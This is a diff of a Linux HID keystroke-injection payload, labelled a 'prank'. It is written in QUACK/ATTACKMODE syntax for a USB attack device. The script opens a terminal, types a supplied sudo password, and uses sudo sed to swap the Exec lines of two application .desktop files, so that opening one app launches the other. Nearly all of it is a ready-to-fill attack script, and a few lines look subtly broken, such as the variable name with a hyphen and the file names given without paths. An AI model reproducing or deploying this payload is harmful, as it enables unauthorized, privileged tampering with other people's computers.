@@ -1,50 +1,38 @@
-* #######################################################
-* #                                                     |
-* # Title        : Change The App That Will Be Runned   |
-* # Author       : Aleff                                |
-* # Version      : 1.0                                  |
-* # Category     : Prank                                |
-* # Target       : GNU/Linux (Debian based tested)      |
-* #                                                     |
-* #######################################################
+#######################################################
+#                                                     #
+# Title        : Change The App That Will Be Runned   #
+# Author       : Aleff                                #
+# Version      : 1.0                                  #
+# Category     : Prank                                #
+# Target       : GNU/Linux (Debian based tested)      #
+#                                                     #
+#######################################################
 
+ATTACKMODE HID
 
-* Requirements:
-*     - sudo permissions
+# REQUIREMENTS
+#  - sudo password (so the permissions)
 
+# VARIABLES
+# - sudo permissions needed, edit SUDO with sudoers password
+SUDO-PSWD='example'
+# - You must know the original desktop name file, if you don't know it you can rich this information download the app on you system and going to /usr/share/applications/ searching this one app, i.e. the desktop file name of Signal application is signal-desktop.desktop, so in this case you should put signal-desktop.desktop
+ORIGINAL_DESKTOP_FILE_NAME_1='example'
+ORIGINAL_DESKTOP_EXEC_COMMAND_1='example'
+ORIGINAL_DESKTOP_FILE_NAME_2='example'
+ORIGINAL_DESKTOP_EXEC_COMMAND_2='example'
 
-* You must know the original desktop name file, if you don't know it you can rich this information download the app on you system and going to /usr/share/applications/ searching this one app, i.e. the desktop file name of Signal application is signal-desktop.desktop, so in this case you should put signal-desktop.desktop
-* DEFINE #ORIGINAL_DESKTOP_FILE_NAME_1 example
-* DEFINE #ORIGINAL_DESKTOP_EXEC_COMMAND_1 example
-* DEFINE #ORIGINAL_DESKTOP_FILE_NAME_2 example
-* DEFINE #ORIGINAL_DESKTOP_EXEC_COMMAND_2 example
-
-
-* Open a shell
-QUACK DELAY 2000
+# Open a shell
+QUACK DELAY 1500
 QUACK CTRL-ALT t
 QUACK DELAY 1000
-
-QUACK STRING sudo sed -i '/^Exec=/s/.*/
-* [CHANGE IT]
-QUACK STRING #ORIGINAL_DESKTOP_EXEC_COMMAND_2
-QUACK STRING /' 
-* [CHANGE IT]
-QUACK STRING #ORIGINAL_DESKTOP_FILE_NAME_1
+QUACK STRING sudo sed -i '/^Exec=/s/.*/$ORIGINAL_DESKTOP_EXEC_COMMAND_2/' $ORIGINAL_DESKTOP_FILE_NAME_1
 QUACK ENTER
 QUACK DELAY 500
-
-* sudo permissions needed, edit SUDO with sudoers password
-QUACK STRING SUDO
+QUACK STRING $SUDO-PSWD
 QUACK ENTER
 QUACK DELAY 4000
-
-QUACK STRING sudo sed -i '/^Exec=/s/.*/
-* [CHANGE IT]
-QUACK STRING #ORIGINAL_DESKTOP_EXEC_COMMAND_1
-QUACK STRING /' 
-* [CHANGE IT]
-QUACK STRING #ORIGINAL_DESKTOP_FILE_NAME_2
+QUACK STRING sudo sed -i '/^Exec=/s/.*/$ORIGINAL_DESKTOP_EXEC_COMMAND_1/' $ORIGINAL_DESKTOP_FILE_NAME_2
 QUACK ENTER
 QUACK DELAY 1000
 QUACK ALT f4
